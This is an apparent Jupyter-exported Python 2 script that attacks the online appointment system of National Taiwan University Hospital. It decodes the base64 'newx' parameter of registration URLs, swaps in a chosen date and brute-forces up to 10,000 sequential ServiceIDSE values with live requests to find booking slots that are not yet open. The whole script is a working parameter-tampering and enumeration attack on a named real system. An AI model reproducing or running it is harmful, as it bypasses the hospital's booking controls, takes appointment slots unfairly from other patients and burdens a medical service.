#!/usr/bin/env python
# coding: utf-8

# In[1]:



import requests, hashlib, urlparse, time, string, base64, sys, threading
from bs4 import BeautifulSoup
data = ''
cookies = 0


# In[2]:


def url_decode(url):
    #url = "https://reg.ntuh.gov.tw/WebAdministration/RegistForm.aspx?newx=UwBlAHIAdgBpAGMAZQBJAEQAUwBFAD0ANAAwADkANQAxADgAOQAmAEUAbgBjAHIAeQBwAHQAQwBvAGQAZQA9AFQAMABTAFUAUgBHADEAMwAyADAAMgAwADAAMwAyADAAJgB1AHMAZQBEAHIAUgBlAHMAdABDAG4AdAA9AG4A0"
    url_p = urlparse.urlparse(url).query[5:]
    print "url_p:", url_p
    print "----------------------------------------"
    
    if url_p[-1:] == '0':
        parameter = base64.b64decode(url_p[:-1]).decode('utf-8')
        #print "parameter:",parameter
        #print "parameter:", parameter.split('&')
        parameter = parameter.encode('base64')+'0'
        new_url = "https://reg.ntuh.gov.tw/WebAdministration/RegistForm.aspx?newx=" + parameter
        print "\nThis URL is:\n", new_url.replace('\n','')
        print "----------------------------------------\n"
    if url_p[-1:] == '2':
        parameter = base64.b64decode(url_p+"=").decode('utf-8')
        #print "parameter:",parameter
        #print "parameter:", parameter.split('&')
        parameter = parameter.encode('base64')+'0'
        new_url = "https://reg.ntuh.gov.tw/WebAdministration/RegistForm.aspx?newx=" + parameter
        print "\nThis URL is:\n", new_url.replace('\n','')
        print "----------------------------------------\n"
    
    
    for j in range(1):
            r = requests.get(new_url.replace('\n',''), data = data, cookies=cookies)
            soup = BeautifulSoup(r.text, "html.parser")
            #print soup.text
            if soup.find(id="ShowTime").text:
                print "Web Check:\n", soup.find(id="ShowTime").text, "\n", new_url.replace('\n','')
                print "----------------------------------------\n"
                break
            else:
                continue



# In[3]:


def url_remake(url):
    url_p = urlparse.urlparse(url).query[5:]
    if url_p[-1:] == '0':
        parameter = base64.b64decode(url_p[:-1])
        print "parameter:",parameter.replace('\x00','')
        print "parameter:",parameter.replace('\x00','').split('&')
    if url_p[-1:] == '2':
        parameter = base64.b64decode(url_p+"=").decode('utf-8')
        print "parameter:",parameter.replace('\x00','')
        print "parameter:",parameter.replace('\x00','').split('&')
        print "parameter:",parameter.split('&')
    print "----------------------------------------\n"
   

    ServiceIDSE = int(parameter.replace('\x00','').split('&')[0][12:],)
    EncryptCode = str(parameter.replace('\x00','').split('&')[1][12:],)
    useDrRestCnt = str(parameter.replace('\x00','').split('&')[2][13:],)
    print "ServiceIDSE:", ServiceIDSE
    print "EncryptCode:", EncryptCode[:8] + dateyouwant
    print "useDrRestCnt:", useDrRestCnt[0]
    
    ServiceIDSE+=ServiceIDSE_guess ### Gap Number
    

    #Bruteforce
    for i in xrange(1,10000):
        ServiceIDSE = ServiceIDSE+1
        parameter = "ServiceIDSE=" + str(ServiceIDSE) + "&EncryptCode=" +  (EncryptCode[:8] + dateyouwant) + "&useDrRestCnt=" + useDrRestCnt[0]
        parameter = "\x00".join(parameter)
        parameter += "\x00\r\n\r" 
        parameter_detail = parameter
        parameter = base64.b64encode(parameter).replace('0=','2')+'0'
        #print "parameter_b64:", parameter    
        new_url = "https://reg.ntuh.gov.tw/WebAdministration/RegistForm.aspx?newx=" + parameter
        #print "\n",new_url.replace('\n','')

        time.sleep(0.1)
        #sys.stdout.write("\r%d%%" % i)
        sys.stdout.write("\rServiceIDSE= %s" % ServiceIDSE)
        sys.stdout.flush()

        for j in range(1):
            r = requests.get(new_url.replace('\n',''), data = data, cookies=cookies)
            soup = BeautifulSoup(r.text, "html.parser")
            #print soup.text
            if soup.find(id="ShowTime").text:
                print "\n################Successful######################" 
                print soup.find(id="ShowTime").text
                print "parameter:", parameter_detail
                print "Next URL is:", new_url.replace('\n','')
                print "\n###################################################" 
                return
            else:
                break


# In[5]:


#url=str(input('請輸入想掛的醫生網址：'))
url="https://reg.ntuh.gov.tw/webadministration/RegistForm.aspx?newx=UwBlAHIAdgBpAGMAZQBJAEQAUwBFAD0ANAAxADEAOAA0ADQAOAAmAEUAbgBjAHIAeQBwAHQAQwBvAGQAZQA9AFQAMABEAEUATgBUADAAOQAyADAAMgAwADAANAAwADgAJgB1AHMAZQBEAHIAUgBlAHMAdABDAG4AdAA9AA2" #請在此貼上掛號網址
url_decode(url)
dateyouwant=str(input('請輸入想掛號的日期：'))
ServiceIDSE_guess = int(input('Guess Gap Number (Min=0):')) #兩個網址參數ServiceIDSE的間隔
url_remake(url)
#threading.Thread(target=url_remake, args=(url, )).start(


# In[6]:

'''
url= "https://reg.ntuh.gov.tw/WebAdministration/RegistForm.aspx?newx=UwBlAHIAdgBpAGMAZQBJAEQAUwBFAD0ANAAxADIANgAwADIANgAmAEUAbgBjAHIAeQBwAHQAQwBvAGQAZQA9AFQAMABEAEUATgBUADAAOQAyADAAMgAwADAANAAxADUAJgB1AHMAZQBEAHIAUgBlAHMAdABDAG4AdAA9AA0ADQoN0"
url_decode(url)
dateyouwant=str(input('請輸入想掛號的日期：'))
ServiceIDSE_guess = int(input('Guess Gap Number (Min=0):'))
url_remake(url)


# In[ ]:
'''


